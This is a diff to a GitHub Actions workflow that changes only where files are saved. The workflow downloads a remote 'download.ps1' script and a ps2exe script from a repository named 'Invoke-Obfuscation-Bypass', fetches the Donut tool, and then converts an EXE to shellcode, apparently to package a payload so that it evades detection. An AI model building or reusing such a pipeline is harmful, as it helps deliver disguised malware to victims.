@@ -26,11 +26,11 @@ jobs:
       
 
     - name: Download the latest download.ps1
-      run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -OutFile download.ps1
+      run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -OutFile .\output\download.ps1
       shell: powershell
 
     - name: Download ps2exe.ps1
-      run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/AdminTest0/Invoke-Obfuscation-Bypass/main/ps2exe.ps1 -OutFile ps2exe.ps1
+      run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/AdminTest0/Invoke-Obfuscation-Bypass/main/ps2exe.ps1 -OutFile .\output\ps2exe.ps1
       shell: powershell
 
       
@@ -43,8 +43,8 @@ jobs:
       shell: pwsh
     - name: Download Donut
       run: |
-        Invoke-WebRequest -Uri https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -OutFile donut_v1.0.zip
-        Expand-Archive -Path donut_v1.0.zip
+        Invoke-WebRequest -Uri https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -OutFile .\output\donut_v1.0.zip
+        Expand-Archive -Path .\output\donut_v1.0.zip
       shell: powershell
 
     - name: Convert EXE to Shellcode
